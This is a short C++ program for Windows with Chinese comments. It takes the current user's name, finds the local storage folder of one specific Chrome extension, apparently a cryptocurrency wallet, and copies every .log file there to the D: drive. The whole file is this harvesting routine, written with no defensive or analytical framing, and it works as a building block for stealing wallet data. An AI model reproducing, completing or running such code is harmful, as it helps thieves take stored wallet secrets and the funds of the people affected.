#include <iostream>
#include <windows.h>
#include <string>

using namespace std;

// 定义一个函数来查找并复制.log 文件
void copyLogFiles(const std::string& username, const std::string& folderName) {
    string sourcePath = "C:\\Users\\" + username + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\" + folderName;
    string destinationPath = "D:\\";

    WIN32_FIND_DATAA findData;
    HANDLE hFind;

    // 构建查找文件的路径和模式
    std::string searchPath = sourcePath + "\\*.log";

    hFind = FindFirstFileA(searchPath.c_str(), &findData);

    if (hFind == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to find files" << std::endl;
        return;
    }

    do {
        // 跳过 "." 和 ".." 目录
        if (strcmp(findData.cFileName, ".")!= 0 && strcmp(findData.cFileName, "..")!= 0) {
            std::string sourceFile = sourcePath + "\\" + findData.cFileName;
            std::string destinationFile = destinationPath + findData.cFileName;

            // 复制文件
            if (!CopyFileA(sourceFile.c_str(), destinationFile.c_str(), FALSE)) {
                std::cerr << "Failed to copy file: " << sourceFile << std::endl;
            }
        }
    } while (FindNextFileA(hFind, &findData));

    FindClose(hFind);
}

int main() {
    char username[MAX_PATH + 1];
    DWORD usernameLength = MAX_PATH + 1;

    if (GetUserNameA(username, &usernameLength)) {
        std::string folderName = "nkbihfbeogaeaoehlefnkodbefgpgknn";  // 在此处指定文件夹名称
        copyLogFiles(std::string(username), folderName);
    } else {
        std::cerr << "Failed to get username" << std::endl;
        return 1;
    }

    return 0;
}
